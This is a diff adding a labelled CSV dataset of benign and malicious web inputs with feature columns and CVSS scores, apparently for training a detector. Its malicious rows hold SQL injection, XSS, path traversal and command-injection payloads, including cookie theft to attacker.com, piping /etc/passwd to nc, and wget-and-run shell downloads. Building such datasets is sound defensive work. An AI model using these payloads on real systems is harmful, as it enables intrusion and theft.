@@ -1,0 +1,76 @@
+payload,length,special_char_count,has_sql_keywords,has_script_tags,encoding_flag,cvss_score,label
+"hello world",11,0,0,0,0,0.0,0
+"john@example.com",16,2,0,0,0,0.0,0
+"user123 login",13,0,0,0,0,0.0,0
+"/api/v1/users",13,3,0,0,0,0.0,0
+"search query test",17,0,0,0,0,0.0,0
+"name=john&age=30",16,2,0,0,0,0.0,0
+"SELECT * FROM users",19,2,1,0,0,0.0,1
+"' OR '1'='1",11,4,1,0,0,9.0,1
+"admin' --",9,3,0,0,0,9.0,1
+"UNION SELECT username, password FROM users",42,2,1,0,0,9.0,1
+"DROP TABLE accounts",19,0,1,0,0,9.0,1
+"<script>alert(1)</script>",25,5,0,1,0,7.5,1
+"<img src=x onerror=alert('xss')>",32,7,0,1,0,7.5,1
+"javascript:alert(1)",19,2,0,1,0,7.5,1
+"../../etc/passwd",16,5,0,0,0,8.0,1
+"..\\..\\windows\\system.ini",24,6,0,0,0,8.0,1
+"; ls -la",8,2,0,0,0,9.8,1
+"& ping 8.8.8.8",14,4,0,0,0,9.8,1
+"| cat /etc/shadow",17,3,0,0,0,9.8,1
+"%3Cscript%3E",12,4,0,1,1,7.5,1
+"%27%20OR%201%3D1",16,7,1,0,1,9.0,1
+"normal request again",20,0,0,0,0,0.0,0
+"just another test string",24,0,0,0,0,0.0,0
+"{'username':'admin','password':'1234'}",36,12,0,0,0,0.0,0
+"{'role':'admin','bypass':true}",29,10,0,0,0,6.0,1
+"http://evil.com/shell.txt",25,5,0,0,0,8.5,1
+"Host: 127.0.0.1\r\n",17,4,0,0,0,5.0,1
+"admin'; EXEC master..xp_cmdshell 'ping 10.0.0.1'--",50,8,1,0,0,9.8,1
+"<svg/onload=alert('XSS')>",25,6,0,1,0,7.5,1
+"WAITFOR DELAY '0:0:5'",21,2,1,0,0,9.0,1
+"id=1 AND extractvalue(0x0a, concat(0x7e, version()))",52,9,1,0,0,9.0,1
+"1' OR 1=1 LIMIT 1,1 --",22,4,1,0,0,9.0,1
+"1; SELECT pg_sleep(5); --",25,5,1,0,0,9.0,1
+"username=bob&password=supersecret123",36,2,0,0,0,0.0,0
+"1 UNION ALL SELECT current_user()",33,4,1,0,0,9.0,1
+"email=test@test.com&token=a1b2c3d4",34,2,0,0,0,0.0,0
+"<iframe src=javascript:alert(1)>",32,5,0,1,0,7.5,1
+"javascript:fetch('http://attacker.com/?c='+document.cookie)",59,10,0,1,0,7.5,1
+"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",36,0,0,0,0,0.0,0
+"cat /etc/passwd | nc 192.168.1.5 4444",37,4,0,0,0,9.8,1
+"../../../../../../../../windows/system32/cmd.exe",48,15,0,0,0,8.0,1
+"/%2e%2e/%2e%2e/%2e%2e/etc/passwd",32,15,0,0,1,8.0,1
+"<body onload=alert('XSS')>",26,5,0,1,0,7.5,1
+"{\"$gt\": \"\"}",11,5,0,0,0,6.0,1
+"{\"$where\": \"sleep(5)\"}",20,6,0,0,0,6.0,1
+"page=about.html",15,1,0,0,0,0.0,0
+"category=books&sort=asc&page=2",30,3,0,0,0,0.0,0
+"?input=1' OR '1'='1",19,5,1,0,0,9.0,1
+"?search=<script>alert('xss')</script>",37,8,0,1,0,7.5,1
+"http://localhost:8080/api/users",31,5,0,0,0,0.0,0
+"Content-Type: application/x-www-form-urlencoded",47,2,0,0,0,0.0,0
+"sqlmap/1.5.8#dev (http://sqlmap.org)",36,6,0,0,0,4.0,1
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",41,6,0,0,0,0.0,0
+"Nmap Scripting Engine",21,0,0,0,0,4.0,1
+"SELECT username, role FROM users WHERE id=1",43,2,1,0,0,0.0,0
+"select * from information_schema.tables",39,2,1,0,0,9.0,1
+"\"<script>eval(atob('YWxlcnQoMSk='))</script>\"",45,10,0,1,0,7.5,1
+"eval(''+String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))",69,16,0,1,0,7.5,1
+";wget http://10.0.0.1/shell.sh -O /tmp/shell.sh;chmod +x /tmp/shell.sh;/tmp/shell.sh",84,14,0,0,0,9.8,1
+"admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",48,8,1,0,0,9.0,1
+"' AND 1=(SELECT COUNT(*) FROM tabname)--",40,7,1,0,0,9.0,1
+"../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00",79,25,0,0,1,8.0,1
+"{'payload':'this is a clean json payload'}",42,4,0,0,0,0.0,0
+"{'payload':'this is a clean json payload with ''quotes'''}",56,6,0,0,0,0.0,0
+"-1 union select 1,2,3,4,group_concat(table_name) from information_schema.tables",79,6,1,0,0,9.0,1
+"<math><a xlink:href=\"javascript:alert('XSS')\">XSS</a></math>",60,13,0,1,0,7.5,1
+"<img src=`%00` onerror=alert(1)>",32,6,0,1,1,7.5,1
+"() { :;}; /bin/bash -c \"wget http://example.com/shell -O /tmp/shell; /tmp/shell\"",82,14,0,0,0,9.8,1
+"& type C:\\Windows\\System32\\drivers\\etc\\hosts",43,8,0,0,0,9.8,1
+"file:///etc/passwd",18,4,0,0,0,8.0,1
+"file=http://evil.com/malicious.php",34,6,0,0,0,8.5,1
+"{'user':'admin', '$ne':'a'}",27,7,0,0,0,6.0,1
+"X-Forwarded-For: 127.0.0.1",26,3,0,0,0,5.0,1
+"Authorization: Basic YWRtaW46YWRtaW4=",37,2,0,0,0,0.0,0
+"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",45,4,0,0,0,0.0,0
